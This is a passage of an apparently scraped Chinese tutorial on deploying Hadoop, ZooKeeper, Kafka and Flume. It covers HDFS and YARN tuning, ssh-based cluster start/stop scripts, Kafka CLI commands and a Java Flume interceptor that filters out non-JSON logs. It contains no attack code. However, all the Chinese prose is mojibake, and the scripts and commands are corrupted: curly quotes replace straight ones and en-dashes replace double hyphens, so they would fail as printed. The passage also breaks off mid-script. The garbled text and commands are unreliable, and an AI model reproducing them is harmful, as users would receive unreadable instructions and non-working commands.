title="Hadoopå®‰è£…"></a>Hadoopå®‰è£…</h4><p><strong>1ï¼‰å®‰è£…æ­¥éª¤</strong></p><p>è¯¦è§ï¼šå°šç¡…è°·å¤§æ•°æ®æŠ€æœ¯ä¹‹Hadoopï¼ˆå…¥é—¨ï¼‰</p><p><strong>2ï¼‰é¡¹ç›®ç»éªŒ</strong></p><p><strong>ï¼ˆ1ï¼‰é¡¹ç›®ç»éªŒä¹‹HDFSå­˜å‚¨å¤šç›®å½•</strong></p><p>ç”Ÿäº§ç¯å¢ƒæœåŠ¡å™¨ç£ç›˜æƒ…å†µ</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/abe21863ff846b4404d27ac0cda1460c.png"></p><p>åœ¨hdfs-site.xmlæ–‡ä»¶ä¸­é…ç½®å¤šç›®å½•ï¼Œæ³¨æ„æ–°æŒ‚è½½ç£ç›˜çš„è®¿é—®æƒé™é—®é¢˜ã€‚ï¼ˆæœ¬é¡¹ç›®ä¸éœ€è¦é…ç½®å¤šç›®å½•ï¼Œå¦‚æœé…ç½®å¯åŠ¨hadoopä¼šæŠ¥é”™ï¼‰</p><p>HDFSçš„DataNodeèŠ‚ç‚¹ä¿å­˜æ•°æ®çš„è·¯å¾„ç”±dfs.datanode.data.dirå‚æ•°å†³å®šï¼Œå…¶é»˜è®¤å€¼ä¸ºfile://${hadoop.tmp.dir}/dfs/dataï¼Œè‹¥æœåŠ¡å™¨æœ‰å¤šä¸ªç£ç›˜ï¼Œå¿…é¡»å¯¹è¯¥å‚æ•°è¿›è¡Œä¿®æ”¹ã€‚å¦‚æœåŠ¡å™¨ç£ç›˜å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåˆ™è¯¥å‚æ•°åº”ä¿®æ”¹ä¸ºå¦‚ä¸‹çš„å€¼ã€‚</p><p>&lt;property&gt;</p><p>&lt;name&gt;dfs.datanode.data.dir&lt;/name&gt;</p><p>&lt;value&gt;file:///dfs/data1,file:///hd2/dfs/data2,file:///hd3/dfs/data3,file:///hd4/dfs/data4&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>æ³¨æ„ï¼šæ¯å°æœåŠ¡å™¨æŒ‚è½½çš„ç£ç›˜ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æ¯ä¸ªèŠ‚ç‚¹çš„å¤šç›®å½•é…ç½®å¯ä»¥ä¸ä¸€è‡´ã€‚å•ç‹¬é…ç½®å³å¯ã€‚</p><p><strong>ï¼ˆ2ï¼‰é¡¹ç›®ç»éªŒä¹‹é›†ç¾¤æ•°æ®å‡è¡¡</strong></p><p><strong>èŠ‚ç‚¹é—´æ•°æ®å‡è¡¡</strong></p><p>å¼€å¯æ•°æ®å‡è¡¡å‘½ä»¤ï¼š</p><p>start-balancer.sh -threshold 10</p><p>å¯¹äºå‚æ•°10ï¼Œä»£è¡¨çš„æ˜¯é›†ç¾¤ä¸­å„ä¸ªèŠ‚ç‚¹çš„ç£ç›˜ç©ºé—´åˆ©ç”¨ç‡ç›¸å·®ä¸è¶…è¿‡10%ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´ã€‚</p><p>åœæ­¢æ•°æ®å‡è¡¡å‘½ä»¤ï¼š</p><p>stop-balancer.sh</p><p><strong>ç£ç›˜é—´æ•°æ®å‡è¡¡</strong></p><p>ç”Ÿæˆå‡è¡¡è®¡åˆ’<strong>ï¼ˆæˆ‘ä»¬åªæœ‰ä¸€å—ç£ç›˜ï¼Œä¸ä¼šç”Ÿæˆè®¡åˆ’ï¼‰</strong></p><p>hdfs diskbalancer -plan hadoop103</p><p>æ‰§è¡Œå‡è¡¡è®¡åˆ’</p><p>hdfs diskbalancer -execute hadoop103.plan.json</p><p>æŸ¥çœ‹å½“å‰å‡è¡¡ä»»åŠ¡çš„æ‰§è¡Œæƒ…å†µ</p><p>hdfs diskbalancer -query hadoop103</p><p>å–æ¶ˆå‡è¡¡ä»»åŠ¡</p><p>hdfs diskbalancer -cancel hadoop103.plan.json</p><p><strong>ï¼ˆ3ï¼‰é¡¹ç›®ç»éªŒä¹‹Hadoopå‚æ•°è°ƒä¼˜</strong></p><p>HDFSå‚æ•°è°ƒä¼˜hdfs-site.xml</p><p>The number of Namenode RPC server threads that listen to requests from clients.<br>If dfs.namenode.servicerpc-address is not configured then Namenode RPC server<br>threads listen to requests from all nodes.</p><p>NameNodeæœ‰ä¸€ä¸ªå·¥ä½œçº¿ç¨‹æ± ï¼Œç”¨æ¥å¤„ç†ä¸åŒDataNodeçš„å¹¶å‘å¿ƒè·³ä»¥åŠå®¢æˆ·ç«¯å¹¶å‘çš„å…ƒæ•°æ®æ“ä½œã€‚</p><p>å¯¹äºå¤§é›†ç¾¤æˆ–è€…æœ‰å¤§é‡å®¢æˆ·ç«¯çš„é›†ç¾¤æ¥è¯´ï¼Œé€šå¸¸éœ€è¦å¢å¤§å‚æ•°dfs.namenode.handler.countçš„é»˜è®¤å€¼10ã€‚</p><p>&lt;property&gt;</p><p>&lt;name&gt;dfs.namenode.handler.count&lt;/name&gt;</p><p>&lt;value&gt;10&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>dfs.namenode.handler.count=ï¼Œæ¯”å¦‚é›†ç¾¤è§„æ¨¡ä¸º8å°æ—¶ï¼Œæ­¤å‚æ•°è®¾ç½®ä¸º41ã€‚å¯é€šè¿‡ç®€å•çš„pythonä»£ç è®¡ç®—è¯¥å€¼ï¼Œä»£ç å¦‚ä¸‹ã€‚</p><p>[atguigu@hadoop102 ~]$ python</p><p>Python 2.7.5 (default, Apr 11 2018, 07:36:10)</p><p>[GCC 4.8.5 20150623 (Red Hat 4.8.5-28)] on linux2</p><p>Type â€œhelpâ€, â€œcopyrightâ€, â€œcreditsâ€ or â€œlicenseâ€ for more information.</p><p>&gt;&gt;&gt; import math</p><p>&gt;&gt;&gt; print int(20*math.log(8))</p><p>41</p><p>&gt;&gt;&gt; quit()</p><p>YARNå‚æ•°è°ƒä¼˜yarn-site.xml</p><p><strong>æƒ…æ™¯æè¿°</strong>ï¼šæ€»å…±7å°æœºå™¨ï¼Œæ¯å¤©å‡ äº¿æ¡æ•°æ®ï¼Œæ•°æ®æº-&gt;Flume-&gt;Kafka-&gt;HDFS-&gt;Hive</p><p><strong>é¢ä¸´é—®é¢˜</strong>ï¼šæ•°æ®ç»Ÿè®¡ä¸»è¦ç”¨HiveSQLï¼Œæ²¡æœ‰æ•°æ®å€¾æ–œï¼Œå°æ–‡ä»¶å·²ç»åšäº†åˆå¹¶å¤„ç†ï¼Œå¼€å¯çš„JVMé‡ç”¨ï¼Œè€Œä¸”IOæ²¡æœ‰é˜»å¡ï¼Œå†…å­˜ç”¨äº†ä¸åˆ°50%ã€‚ä½†æ˜¯è¿˜æ˜¯è·‘çš„éå¸¸æ…¢ï¼Œè€Œä¸”æ•°æ®é‡æ´ªå³°è¿‡æ¥æ—¶ï¼Œæ•´ä¸ªé›†ç¾¤éƒ½ä¼šå®•æ‰ã€‚åŸºäºè¿™ç§æƒ…å†µæœ‰æ²¡æœ‰ä¼˜åŒ–æ–¹æ¡ˆã€‚</p><p><strong>è§£å†³åŠæ³•ï¼Œä¿®æ”¹yarnå…³é”®å‚æ•°ï¼š</strong></p><p>å†…å­˜åˆ©ç”¨ç‡ä¸å¤Ÿã€‚è¿™ä¸ªä¸€èˆ¬æ˜¯Yarnçš„2ä¸ªé…ç½®é€ æˆçš„ï¼Œå•ä¸ªä»»åŠ¡å¯ä»¥ç”³è¯·çš„æœ€å¤§å†…å­˜å¤§å°ï¼Œå’ŒHadoopå•ä¸ªèŠ‚ç‚¹å¯ç”¨å†…å­˜å¤§å°ã€‚è°ƒèŠ‚è¿™ä¸¤ä¸ªå‚æ•°èƒ½æé«˜ç³»ç»Ÿå†…å­˜çš„åˆ©ç”¨ç‡ã€‚</p><p>ï¼ˆaï¼‰yarn.nodemanager.resource.memory-mb</p><p>è¡¨ç¤ºè¯¥èŠ‚ç‚¹ä¸ŠYARNå¯ä½¿ç”¨çš„ç‰©ç†å†…å­˜æ€»é‡ï¼Œé»˜è®¤æ˜¯8192ï¼ˆMBï¼‰ï¼Œæ³¨æ„ï¼Œå¦‚æœä½ çš„èŠ‚ç‚¹å†…å­˜èµ„æºä¸å¤Ÿ8GBï¼Œåˆ™éœ€è¦è°ƒå‡å°è¿™ä¸ªå€¼ï¼Œè€ŒYARNä¸ä¼šæ™ºèƒ½çš„æ¢æµ‹èŠ‚ç‚¹çš„ç‰©ç†å†…å­˜æ€»é‡ã€‚</p><p>ï¼ˆbï¼‰yarn.scheduler.maximum-allocation-mb</p><p>å•ä¸ªä»»åŠ¡å¯ç”³è¯·çš„æœ€å¤šç‰©ç†å†…å­˜é‡ï¼Œé»˜è®¤æ˜¯8192ï¼ˆMBï¼‰ã€‚</p><h4 id="Zookeeperå®‰è£…"><a href="#Zookeeperå®‰è£…" class="headerlink" title="Zookeeperå®‰è£…"></a>Zookeeperå®‰è£…</h4><p><strong>1ï¼‰å®‰è£…æ­¥éª¤</strong></p><p>è¯¦è§ï¼šå°šç¡…è°·å¤§æ•°æ®æŠ€æœ¯ä¹‹Zookeeper</p><p><strong>2ï¼‰ZKé›†ç¾¤å¯åŠ¨åœæ­¢è„šæœ¬</strong></p><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºè„šæœ¬</p><p>[atguigu@hadoop102 bin]$ vim zk.sh</p><p>åœ¨è„šæœ¬ä¸­ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>case $1 in</p><p>â€œstartâ€){</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo â€”â€”â€”- zookeeper $i å¯åŠ¨ â€”â€”â€”â€”</p><p>ssh $i â€œ/opt/module/zookeeper-3.5.7/bin/zkServer.sh startâ€</p><p>done</p><p>};;</p><p>â€œstopâ€){</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo â€”â€”â€”- zookeeper $i åœæ­¢ â€”â€”â€”â€”</p><p>ssh $i â€œ/opt/module/zookeeper-3.5.7/bin/zkServer.sh stopâ€</p><p>done</p><p>};;</p><p>â€œstatusâ€){</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo â€”â€”â€”- zookeeper $i çŠ¶æ€ â€”â€”â€”â€”</p><p>ssh $i â€œ/opt/module/zookeeper-3.5.7/bin/zkServer.sh statusâ€</p><p>done</p><p>};;</p><p>esac</p><p>ï¼ˆ2ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod u+x zk.sh</p><p>ï¼ˆ3ï¼‰Zookeeperé›†ç¾¤å¯åŠ¨è„šæœ¬</p><p>[atguigu@hadoop102 module]$ zk.sh start</p><p>ï¼ˆ4ï¼‰Zookeeperé›†ç¾¤åœæ­¢è„šæœ¬</p><p>[atguigu@hadoop102 module]$ zk.sh stop</p><h4 id="Kafkaå®‰è£…"><a href="#Kafkaå®‰è£…" class="headerlink" title="Kafkaå®‰è£…"></a>Kafkaå®‰è£…</h4><p><strong>1ï¼‰å®‰è£…æ­¥éª¤</strong></p><p>è¯¦è§ï¼šå°šç¡…è°·å¤§æ•°æ®æŠ€æœ¯ä¹‹Kafka</p><p><strong>2ï¼‰Kafkaé›†ç¾¤å¯åŠ¨åœæ­¢è„šæœ¬</strong></p><p>ï¼ˆ1ï¼‰åœ¨/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºè„šæœ¬kf.sh</p><p>[atguigu@hadoop102 bin]$ vim kf.sh</p><p>åœ¨è„šæœ¬ä¸­å¡«å†™å¦‚ä¸‹å†…å®¹</p><p>##! /bin/bash</p><p>case $1 in</p><p>â€œstartâ€){</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo â€œ â€”â€”â€“å¯åŠ¨ $i Kafkaâ€”â€”-â€œ</p><p>ssh $i â€œ/opt/module/kafka/bin/kafka-server-start.sh -daemon<br>/opt/module/kafka/config/server.propertiesâ€</p><p>done</p><p>};;</p><p>â€œstopâ€){</p><p>for i in hadoop102 hadoop103 hadoop104</p><p>do</p><p>echo â€œ â€”â€”â€“åœæ­¢ $i Kafkaâ€”â€”-â€œ</p><p>ssh $i â€œ/opt/module/kafka/bin/kafka-server-stop.sh stopâ€</p><p>done</p><p>};;</p><p>esac</p><p>ï¼ˆ2ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod u+x kf.sh</p><p>ï¼ˆ3ï¼‰kfé›†ç¾¤å¯åŠ¨è„šæœ¬</p><p>[atguigu@hadoop102 module]$ kf.sh start</p><p>ï¼ˆ4ï¼‰kfé›†ç¾¤åœæ­¢è„šæœ¬</p><p>[atguigu@hadoop102 module]$ kf.sh stop</p><p><strong>3ï¼‰Kafkaå¸¸ç”¨å‘½ä»¤</strong></p><p><strong>ï¼ˆ1ï¼‰æŸ¥çœ‹Kafka Topicåˆ—è¡¨</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-topics.sh â€“zookeeper hadoop102:2181/kafka<br>--list</p><p><strong>ï¼ˆ2ï¼‰åˆ›å»ºKafka Topic</strong></p><p>è¿›å…¥åˆ°/opt/module/kafka/ç›®å½•ä¸‹åˆ›å»ºæ—¥å¿—ä¸»é¢˜</p><p>[atguigu@hadoop102 kafka]$ bin/kafka-topics.sh â€“bootstrap-server<br>hadoop102:9092 â€“create â€“replication-factor 2 â€“partitions 3 â€“topic topic_log</p><p><strong>ï¼ˆ3ï¼‰åˆ é™¤Kafka Topic</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-topics.sh â€“delete â€“bootstrap-server<br>hadoop102:9092 â€“topic topic_log</p><p><strong>ï¼ˆ4ï¼‰Kafkaç”Ÿäº§æ¶ˆæ¯</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-console-producer.sh \</p><p>--broker-list hadoop102:9092 â€“topic topic_log</p><p>&gt;hello world</p><p>&gt;atguigu atguigu</p><p><strong>ï¼ˆ5ï¼‰Kafkaæ¶ˆè´¹æ¶ˆæ¯</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-console-consumer.sh \</p><p>--bootstrap-server hadoop102:9092 â€“from-beginning â€“topic topic_log</p><p>--from-beginningï¼šä¼šæŠŠä¸»é¢˜ä¸­ä»¥å¾€æ‰€æœ‰çš„æ•°æ®éƒ½è¯»å–å‡ºæ¥ã€‚æ ¹æ®ä¸šåŠ¡åœºæ™¯é€‰æ‹©æ˜¯å¦å¢åŠ è¯¥é…ç½®ã€‚</p><p><strong>ï¼ˆ6ï¼‰æŸ¥çœ‹Kafka Topicè¯¦æƒ…</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-topics.sh â€“zookeeper hadoop102:2181/kafka<br>\</p><p>--describe â€“topic topic_log</p><h4 id="Flumeå®‰è£…"><a href="#Flumeå®‰è£…" class="headerlink" title="Flumeå®‰è£…"></a>Flumeå®‰è£…</h4><p>æŒ‰ç…§é‡‡é›†é€šé“è§„åˆ’ï¼Œéœ€åœ¨hadoop102ï¼Œhadoop103ï¼Œhadoop104ä¸‰å°èŠ‚ç‚¹åˆ†åˆ«éƒ¨ç½²ä¸€ä¸ªFlumeã€‚<strong>å¯å‚ç…§ä»¥ä¸‹æ­¥éª¤å…ˆåœ¨hadoop102å®‰è£…ï¼Œç„¶åå†è¿›è¡Œåˆ†å‘ã€‚</strong></p><p><strong>1ï¼‰å®‰è£…æ­¥éª¤</strong></p><p>è¯¦è§ï¼šå°šç¡…è°·å¤§æ•°æ®æŠ€æœ¯ä¹‹Flume</p><p><strong>2ï¼‰åˆ†å‘Flume</strong></p><p>[atguigu@hadoop102 ~]$ xsync /opt/module/flume/</p><p><strong>3ï¼‰é¡¹ç›®ç»éªŒ</strong></p><p><strong>ï¼ˆ1ï¼‰å †å†…å­˜è°ƒæ•´</strong></p><p>Flumeå †å†…å­˜é€šå¸¸è®¾ç½®ä¸º4Gæˆ–æ›´é«˜ï¼Œé…ç½®æ–¹å¼å¦‚ä¸‹ï¼š</p><p>ä¿®æ”¹/opt/module/flume/conf/flume-env.shæ–‡ä»¶ï¼Œé…ç½®å¦‚ä¸‹å‚æ•°<strong>ï¼ˆè™šæ‹Ÿæœºç¯å¢ƒæš‚ä¸é…ç½®ï¼Œåƒä¸‡åˆ«é…ï¼‰</strong></p><p>export JAVA_OPTS=â€-Xms4096m -Xmx4096m -Dcom.sun.management.jmxremoteâ€</p><p>æ³¨ï¼š</p><p>-Xmsè¡¨ç¤ºJVM Heap(å †å†…å­˜)æœ€å°å°ºå¯¸ï¼Œåˆå§‹åˆ†é…ï¼›</p><p>-Xmx è¡¨ç¤ºJVM Heap(å †å†…å­˜)æœ€å¤§å…è®¸çš„å°ºå¯¸ï¼ŒæŒ‰éœ€åˆ†é…ã€‚</p><h3 id="æ—¥å¿—é‡‡é›†Flume"><a href="#æ—¥å¿—é‡‡é›†Flume" class="headerlink" title="æ—¥å¿—é‡‡é›†Flume"></a>æ—¥å¿—é‡‡é›†Flume</h3><h4 id="æ—¥å¿—é‡‡é›†Flumeé…ç½®æ¦‚è¿°"><a href="#æ—¥å¿—é‡‡é›†Flumeé…ç½®æ¦‚è¿°" class="headerlink" title="æ—¥å¿—é‡‡é›†Flumeé…ç½®æ¦‚è¿°"></a>æ—¥å¿—é‡‡é›†Flumeé…ç½®æ¦‚è¿°</h4><p>æŒ‰ç…§è§„åˆ’ï¼Œéœ€è¦é‡‡é›†çš„ç”¨æˆ·è¡Œä¸ºæ—¥å¿—æ–‡ä»¶åˆ†å¸ƒåœ¨hadoop102ï¼Œhadoop103ä¸¤å°æ—¥å¿—æœåŠ¡å™¨ï¼Œæ•…éœ€è¦åœ¨hadoop102ï¼Œhadoop103ä¸¤å°èŠ‚ç‚¹é…ç½®æ—¥å¿—é‡‡é›†Flumeã€‚æ—¥å¿—é‡‡é›†Flumeéœ€è¦é‡‡é›†æ—¥å¿—æ–‡ä»¶å†…å®¹ï¼Œå¹¶å¯¹æ—¥å¿—æ ¼å¼ï¼ˆJSONï¼‰è¿›è¡Œæ ¡éªŒï¼Œç„¶åå°†æ ¡éªŒé€šè¿‡çš„æ—¥å¿—å‘é€åˆ°Kafkaã€‚</p><p>æ­¤å¤„å¯é€‰æ‹©TaildirSourceå’ŒKafkaChannelï¼Œå¹¶é…ç½®æ—¥å¿—æ ¡éªŒæ‹¦æˆªå™¨ã€‚</p><p>é€‰æ‹©TailDirSourceå’ŒKafkaChannelçš„åŸå› å¦‚ä¸‹ï¼š</p><p><strong>1ï¼‰TailDirSource</strong></p><p>TailDirSourceç›¸æ¯”ExecSourceã€SpoolingDirectorySourceçš„ä¼˜åŠ¿</p><p>TailDirSourceï¼šæ–­ç‚¹ç»­ä¼ ã€å¤šç›®å½•ã€‚Flume1.6ä»¥å‰éœ€è¦è‡ªå·±è‡ªå®šä¹‰Sourceè®°å½•æ¯æ¬¡è¯»å–æ–‡ä»¶ä½ç½®ï¼Œå®ç°æ–­ç‚¹ç»­ä¼ ã€‚</p><p>ExecSourceå¯ä»¥å®æ—¶æœé›†æ•°æ®ï¼Œä½†æ˜¯åœ¨Flumeä¸è¿è¡Œæˆ–è€…Shellå‘½ä»¤å‡ºé”™çš„æƒ…å†µä¸‹ï¼Œæ•°æ®å°†ä¼šä¸¢å¤±ã€‚</p><p>SpoolingDirectorySourceç›‘æ§ç›®å½•ï¼Œæ”¯æŒæ–­ç‚¹ç»­ä¼ ã€‚</p><p><strong>2ï¼‰KafkaChannel</strong></p><p>é‡‡ç”¨Kafka Channelï¼Œçœå»äº†Sinkï¼Œæé«˜äº†æ•ˆç‡ã€‚</p><p>æ—¥å¿—é‡‡é›†Flumeå…³é”®é…ç½®å¦‚ä¸‹ï¼š</p><h4 id="æ—¥å¿—é‡‡é›†Flumeé…ç½®å®æ“"><a href="#æ—¥å¿—é‡‡é›†Flumeé…ç½®å®æ“" class="headerlink" title="æ—¥å¿—é‡‡é›†Flumeé…ç½®å®æ“"></a>æ—¥å¿—é‡‡é›†Flumeé…ç½®å®æ“</h4><p><strong>1ï¼‰åˆ›å»ºFlumeé…ç½®æ–‡ä»¶</strong></p><p>åœ¨hadoop102èŠ‚ç‚¹çš„Flumeçš„jobç›®å½•ä¸‹åˆ›å»ºfile_to_kafka.conf</p><p>[atguigu@hadoop104 flume]$ mkdir job</p><p>[atguigu@hadoop104 flume]$ vim job/file_to_kafka.conf</p><p><strong>2ï¼‰é…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹</strong></p><p>##ä¸ºå„ç»„ä»¶å‘½å</p><p>a1.sources = r1</p><p>a1.channels = c1</p><p>##æè¿°source</p><p>a1.sources.r1.type = TAILDIR</p><p>a1.sources.r1.filegroups = f1</p><p>a1.sources.r1.filegroups.f1 = /opt/module/applog/log/app.*</p><p>a1.sources.r1.positionFile = /opt/module/flume/taildir_position.json</p><p>a1.sources.r1.interceptors = i1</p><p>a1.sources.r1.interceptors.i1.type =<br>com.atguigu.flume.interceptor.ETLInterceptor$Builder</p><p>##æè¿°channel</p><p>a1.channels.c1.type = org.apache.flume.channel.kafka.KafkaChannel</p><p>a1.channels.c1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092</p><p>a1.channels.c1.kafka.topic = topic_log</p><p>a1.channels.c1.parseAsFlumeEvent = false</p><p>##ç»‘å®šsourceå’Œchannelä»¥åŠsinkå’Œchannelçš„å…³ç³»</p><p>a1.sources.r1.channels = c1</p><p><strong>3ï¼‰ç¼–å†™Flumeæ‹¦æˆªå™¨</strong></p><p>ï¼ˆ1ï¼‰åˆ›å»ºMavenå·¥ç¨‹flume-interceptor</p><p>ï¼ˆ2ï¼‰åˆ›å»ºåŒ…ï¼šcom.atguigu.flume.interceptor</p><p>ï¼ˆ3ï¼‰åœ¨pom.xmlæ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹é…ç½®</p><p>&lt;dependencies&gt;<br>&lt;dependency&gt;<br>&lt;groupId&gt;org.apache.flume&lt;/groupId&gt;<br>&lt;artifactId&gt;flume-ng-core&lt;/artifactId&gt;<br>&lt;version&gt;1.9.0&lt;/version&gt;<br>&lt;scope&gt;provided&lt;/scope&gt;<br>&lt;/dependency&gt;  </p><p>&lt;dependency&gt;<br>&lt;groupId&gt;com.alibaba&lt;/groupId&gt;<br>&lt;artifactId&gt;fastjson&lt;/artifactId&gt;<br>&lt;version&gt;1.2.62&lt;/version&gt;<br>&lt;/dependency&gt;<br>&lt;/dependencies&gt;  </p><p>&lt;build&gt;<br>&lt;plugins&gt;<br>&lt;plugin&gt;<br>&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;<br>&lt;version&gt;2.3.2&lt;/version&gt;<br>&lt;configuration&gt;<br>&lt;source&gt;1.8&lt;/source&gt;<br>&lt;target&gt;1.8&lt;/target&gt;<br>&lt;/configuration&gt;<br>&lt;/plugin&gt;<br>&lt;plugin&gt;<br>&lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt;<br>&lt;configuration&gt;<br>&lt;descriptorRefs&gt;<br>&lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt;<br>&lt;/descriptorRefs&gt;<br>&lt;/configuration&gt;<br>&lt;executions&gt;<br>&lt;execution&gt;<br>&lt;id&gt;make-assembly&lt;/id&gt;<br>&lt;phase&gt;package&lt;/phase&gt;<br>&lt;goals&gt;<br>&lt;goal&gt;single&lt;/goal&gt;<br>&lt;/goals&gt;<br>&lt;/execution&gt;<br>&lt;/executions&gt;<br>&lt;/plugin&gt;<br>&lt;/plugins&gt;<br>&lt;/build&gt;</p><p>ï¼ˆ4ï¼‰åœ¨com.atguigu.flume.interceptoråŒ…ä¸‹åˆ›å»ºJSONUtilsç±»</p><p>package com.atguigu.flume.interceptor;  </p><p>import com.alibaba.fastjson.JSON;<br>import com.alibaba.fastjson.JSONException;  </p><p>public class JSONUtils {<br>public static boolean isJSONValidate(String log){<br>try {<br>JSON.parse(log);<br>return true;<br>}catch (JSONException e){<br>return false;<br>}<br>}<br>}</p><p>ï¼ˆ5ï¼‰åœ¨com.atguigu.flume.interceptoråŒ…ä¸‹åˆ›å»ºLogInterceptorç±»</p><p>package com.atguigu.flume.interceptor;</p><p>import com.alibaba.fastjson.JSON;</p><p>import org.apache.flume.Context;</p><p>import org.apache.flume.Event;</p><p>import org.apache.flume.interceptor.Interceptor;</p><p>import java.nio.charset.StandardCharsets;</p><p>import java.util.Iterator;</p><p>import java.util.List;</p><p>public class ETLInterceptor implements Interceptor {</p><p>@Override</p><p>public void initialize() {</p><p>}</p><p>@Override</p><p>public Event intercept(Event event) {</p><p>byte[] body = event.getBody();</p><p>String log = new String(body, StandardCharsets.UTF_8);</p><p>if (JSONUtils.isJSONValidate(log)) {</p><p>return event;</p><p>} else {</p><p>return null;</p><p>}</p><p>}</p><p>@Override</p><p>public List&lt;Event&gt; intercept(List&lt;Event&gt; list) {</p><p>Iterator&lt;Event&gt; iterator = list.iterator();</p><p>while (iterator.hasNext()){</p><p>Event next = iterator.next();</p><p>if(intercept(next)==null){</p><p>iterator.remove();</p><p>}</p><p>}</p><p>return list;</p><p>}</p><p>public static class Builder implements Interceptor.Builder{</p><p>@Override</p><p>public Interceptor build() {</p><p>return new ETLInterceptor();</p><p>}</p><p>@Override</p><p>public void configure(Context context) {</p><p>}</p><p>}</p><p>@Override</p><p>public void close() {</p><p>}</p><p>}</p><p>ï¼ˆ6ï¼‰æ‰“åŒ…</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/361c38002f9891ce01e4771948d70b01.png" alt="å›¾ç‰‡åŒ…å« å›¾å½¢ç”¨æˆ·ç•Œé¢æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p>ï¼ˆ7ï¼‰éœ€è¦å…ˆå°†æ‰“å¥½çš„åŒ…æ”¾å…¥åˆ°hadoop102çš„/opt/module/flume/libæ–‡ä»¶å¤¹ä¸‹é¢ã€‚</p><h4 id="æ—¥å¿—é‡‡é›†Flumeæµ‹è¯•"><a href="#æ—¥å¿—é‡‡é›†Flumeæµ‹è¯•" class="headerlink" title="æ—¥å¿—é‡‡é›†Flumeæµ‹è¯•"></a>æ—¥å¿—é‡‡é›†Flumeæµ‹è¯•</h4><p><strong>1ï¼‰å¯åŠ¨Zookeeperã€Kafkaé›†ç¾¤</strong></p><p><strong>2ï¼‰å¯åŠ¨hadoop102çš„æ—¥å¿—é‡‡é›†Flume</strong></p><p>[atguigu@hadoop102 flume]$ bin/flume-ng agent -n a1 -c conf/ -f<br>job/file_to_kafka.conf -Dflume.root.logger=info,console</p><p><strong>3ï¼‰å¯åŠ¨ä¸€ä¸ªKafkaçš„Console-Consumer</strong></p><p>[atguigu@hadoop102 kafka]$ bin/kafka-console-consumer.sh â€“bootstrap-server<br>hadoop102:9092 â€“topic topic_log</p><p><strong>4ï¼‰ç”Ÿæˆæ¨¡æ‹Ÿæ•°æ®</strong></p><p>[atguigu@hadoop102 ~]$ lg.sh</p><p><strong>5ï¼‰è§‚å¯ŸKafkaæ¶ˆè´¹è€…æ˜¯å¦èƒ½æ¶ˆè´¹åˆ°æ•°æ®</strong></p><h4 id="æ—¥å¿—é‡‡é›†Flumeå¯åœè„šæœ¬"><a href="#æ—¥å¿—é‡‡é›†Flumeå¯åœè„šæœ¬" class="headerlink" title="æ—¥å¿—é‡‡é›†Flumeå¯åœè„šæœ¬"></a>æ—¥å¿—é‡‡é›†Flumeå¯åœè„šæœ¬</h4><p><strong>1ï¼‰åˆ†å‘æ—¥å¿—é‡‡é›†Flumeé…ç½®æ–‡ä»¶å’Œæ‹¦æˆªå™¨</strong></p><p>è‹¥ä¸Šè¿°æµ‹è¯•é€šè¿‡ï¼Œéœ€å°†hadoop102èŠ‚ç‚¹çš„Flumeçš„é…ç½®æ–‡ä»¶å’Œæ‹¦æˆªå™¨jaråŒ…ï¼Œå‘å¦ä¸€å°æ—¥å¿—æœåŠ¡å™¨å‘é€ä¸€ä»½ã€‚</p><p>[atguigu@hadoop102 flume]$ scp -r job hadoop103:/opt/module/flume/</p><p>[atguigu@hadoop102 flume]$ scp<br>lib/flume-interceptor-1.0-SNAPSHOT-jar-with-dependencies.jar<br>hadoop103:/opt/module/flume/lib/</p><p><strong>2ï¼‰æ–¹ä¾¿èµ·è§ï¼Œæ­¤å¤„ç¼–å†™ä¸€ä¸ªæ—¥å¿—é‡‡é›†Flumeè¿›ç¨‹çš„å¯åœè„šæœ¬</strong></p><p><strong>1ï¼‰åœ¨hadoop102èŠ‚ç‚¹çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºè„šæœ¬f1.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim f1.sh</p><p>åœ¨è„šæœ¬ä¸­å¡«å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>case $1 in</p><p>â€œstartâ€){</p><p>for i in hadoop102 hadoop103</p><p>do</p><p>echo â€œ â€”â€”â€“å¯åŠ¨ $i é‡‡é›†flumeâ€”â€”-â€œ</p><p>ssh $i â€œnohup /opt/module/flume/bin/flume-ng agent -n a1 -c<br>/opt/module/flume/conf/ -f /opt/module/flume/job/file_to_kafka.conf &gt;/dev/null<br>2&gt;&amp;1 &amp;â€</p><p>done</p><p>};;</p><p>â€œstopâ€){</p><p>for i in hadoop102 hadoop103</p><p>do</p><p>echo â€œ â€”â€”â€“åœæ­¢ $i 